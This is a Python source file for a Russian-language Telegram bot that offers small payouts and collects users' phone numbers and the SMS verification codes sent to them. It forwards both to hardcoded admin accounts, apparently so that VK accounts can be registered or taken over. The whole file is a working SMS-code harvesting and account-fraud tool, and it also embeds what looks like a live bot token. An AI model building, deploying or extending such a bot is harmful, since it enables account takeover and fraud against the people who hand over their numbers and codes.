import asyncio
import logging
import aiosqlite
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

TOKEN = "8527593341:AAFSVj-6REvcGL7UpsMlRWqnZlZw8GaXA4Y"
ADMIN_IDS = [7323981601, 8383446699]
SUPPORT_LINK = "https://t.me/ik_126"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

WORK_STATUS = True

class Form(StatesGroup):
    choosing_tariff = State()
    entering_number = State()
    entering_code = State()

async def init_db():
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS requests 
                           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                            phone TEXT, tariff TEXT, code TEXT, status INTEGER DEFAULT 0)''')
        await db.commit()

def main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="💸 ПОДКЛЮЧИТЬ ВЫПЛАТЫ / ВВЕСТИ НОМЕР")],
            [KeyboardButton(text="🆘 ТЕХ. ПОДДЕРЖКА")]
        ],
        resize_keyboard=True
    )

def tariff_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="⚡️ 1.5$ Рег Момент")],
            [KeyboardButton(text="🔙 Назад")]
        ],
        resize_keyboard=True
    )

@dp.message(Command("start"))
async def start(message: types.Message):
    text = ("<b>👋 ДОБРО ПОЖАЛОВАТЬ!</b>\n\n"
            "🚀 <b>Система готова к работе.</b>\n"
            "Нерег ВК • Оплата момент\n\n"
            "💸 <b>Доступные действия:</b>")
    await message.answer(text, reply_markup=main_kb(), parse_mode="HTML")

@dp.message(F.text == "💸 ПОДКЛЮЧИТЬ ВЫПЛАТЫ / ВВЕСТИ НОМЕР")
async def payments_start(message: types.Message, state: FSMContext):
    if not WORK_STATUS:
        await message.answer("😴 <b>Прием номеров временно закрыт.</b>", parse_mode="HTML")
        return
    await state.set_state(Form.choosing_tariff)
    await message.answer("💵 <b>Выберите тариф:</b>", reply_markup=tariff_kb(), parse_mode="HTML")

@dp.message(F.text == "🆘 ТЕХ. ПОДДЕРЖКА")
async def support_handler(message: types.Message):
    text = ("<b>🛡 ТЕХНИЧЕСКАЯ ПОДДЕРЖКА</b>\n\n"
            f"👉 <a href='{SUPPORT_LINK}'>НАПИСАТЬ В ПОДДЕРЖКУ</a>")
    await message.answer(text, parse_mode="HTML", disable_web_page_preview=True)

@dp.message(Form.choosing_tariff)
async def process_tariff(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        await message.answer("<b>Главное меню:</b>", reply_markup=main_kb(), parse_mode="HTML")
        return
    
    if message.text != "⚡️ 1.5$ Рег Момент":
        await message.answer("❌ <b>Данный тариф временно недоступен</b>\nВыберите из предложенных:", 
                           reply_markup=tariff_kb(), parse_mode="HTML")
        return
    
    await state.update_data(tariff=message.text)
    await state.set_state(Form.entering_number)
    
    text = ("<b>👤 Добавление по номеру телефона</b>\n\n"
            "Введите номер в формате:\n"
            "<code>+7XXXXXXXXXX</code>\n\n"
            "<i>Отправьте номер сообщением ниже 👇</i>")
    
    await message.answer(
        text,
        parse_mode="HTML",
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="🔙 Назад")]],
            resize_keyboard=True
        )
    )

@dp.message(Form.entering_number)
async def process_number(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        await message.answer("<b>Главное меню:</b>", reply_markup=main_kb(), parse_mode="HTML")
        return
    
    phone = re.sub(r'\D', '', message.text)
    if not (len(phone) == 11 and phone.startswith('7')) and not (len(phone) == 12 and phone.startswith('7')):
        await message.answer("❌ <b>Неверный формат номера.</b>\nИспользуйте: <code>+7XXXXXXXXXX</code>", parse_mode="HTML")
        return
    
    data = await state.get_data()
    
    async with aiosqlite.connect('bot_database.db') as db:
        cursor = await db.execute(
            'INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)',
            (message.from_user.id, phone, data['tariff'])
        )
        request_id = cursor.lastrowid
        await db.commit()
    
    for admin_id in ADMIN_IDS:
        await bot.send_message(
            admin_id,
            f"🆕 <b>Заявка #{request_id}</b>\n"
            f"👤 ID: <code>{message.from_user.id}</code>\n"
            f"📱: <code>{phone}</code>\n"
            f"💰: {data['tariff']}",
            parse_mode="HTML",
            reply_markup=types.InlineKeyboardMarkup(
                inline_keyboard=[
                    [types.InlineKeyboardButton(text="✅ Взять в работу", 
                                              callback_data=f"take_{request_id}_{message.from_user.id}")],
                    [types.InlineKeyboardButton(text="💬 Чат", 
                                              url=f"tg://user?id={message.from_user.id}")]
                ]
            )
        )
    
    await state.clear()
    await message.answer("✅ <b>Номер успешно отправлен!</b>\nОжидайте, администратор свяжется с вами.", 
                       reply_markup=main_kb(), parse_mode="HTML")

@dp.callback_query(F.data.startswith("take_"))
async def take_request(callback: types.CallbackQuery):
    _, req_id, user_id = callback.data.split("_")
    req_id, user_id = int(req_id), int(user_id)
    
    await dp.fsm.get_context(bot, user_id, user_id).set_state(Form.entering_code)
    
    await bot.send_message(
        user_id,
        "🔔 <b>Администратор взял ваш номер в работу!</b>\n\n"
        "Введите код из СМС ниже 👇",
        parse_mode="HTML"
    )
    
    await callback.message.edit_text(
        f"{callback.message.text}\n\n"
        "✅ <b>ВЗЯТО В РАБОТУ</b>",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(Form.entering_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    
    if not code.isdigit() or len(code) < 4:
        await message.answer("❌ <b>Неверный формат кода.</b>\nВведите числовой код из СМС:")
        return
    
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute(
            'UPDATE requests SET code = ?, status = 1 WHERE user_id = ? AND status = 0',
            (code, message.from_user.id)
        )
        await db.commit()
    
    for admin_id in ADMIN_IDS:
        await bot.send_message(
            admin_id,
            f"🔑 <b>ПОЛУЧЕН КОД!</b>\n"
            f"👤 ID: <code>{message.from_user.id}</code>\n"
            f"💬 Код: <code>{code}</code>",
            parse_mode="HTML"
        )
    
    await state.clear()
    await message.answer("✅ <b>Код успешно передан!</b>\nОжидайте выплату.", parse_mode="HTML")

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
